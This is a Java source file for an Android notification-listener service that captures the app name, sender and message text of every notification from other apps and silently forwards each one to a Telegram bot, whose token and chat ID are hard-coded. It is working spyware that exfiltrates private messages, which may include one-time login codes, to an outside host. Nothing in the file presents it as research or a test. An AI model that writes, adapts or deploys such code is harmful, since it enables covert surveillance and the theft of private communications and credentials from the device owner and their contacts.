package com.amirul.digital;

import android.app.Notification;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NLService extends NotificationListenerService {

    private final String BOT_TOKEN = "8847265419:AAG37U_UmnLJXDssJJm0787rzUihUr-7GS8";
    private final String CHAT_ID = "8689242600";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        if (packageName.equals(getPackageName())) return;

        PackageManager pm = getApplicationContext().getPackageManager();
        String appName;
        try {
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            appName = (String) pm.getApplicationLabel(ai);
        } catch (Exception e) {
            appName = packageName;
        }

        Notification notification = sbn.getNotification();
        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
        String message = textChar != null ? textChar.toString() : "";

        if (title.isEmpty() && message.isEmpty()) return;

        sendToTelegram(appName, title, message);
    }

    private void sendToTelegram(String appName, String title, String msg) {
        new Thread(() -> {
            try {
                SimpleDateFormat sdfDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
                SimpleDateFormat sdfTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
                String curDate = sdfDate.format(new Date());
                String curTime = sdfTime.format(new Date());

                String payloadText = "📱 App: " + appName + "\n"
                        + "👤 Sender: " + title + "\n"
                        + "💬 Msg: " + msg + "\n"
                        + "📅 Date: " + curDate + "\n"
                        + "⏰ Time: " + curTime;

                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);

                JSONObject jsonParam = new JSONObject();
                jsonParam.put("chat_id", CHAT_ID);
                jsonParam.put("text", payloadText);

                OutputStream os = conn.getOutputStream();
                os.write(jsonParam.toString().getBytes("UTF-8"));
                os.flush();
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
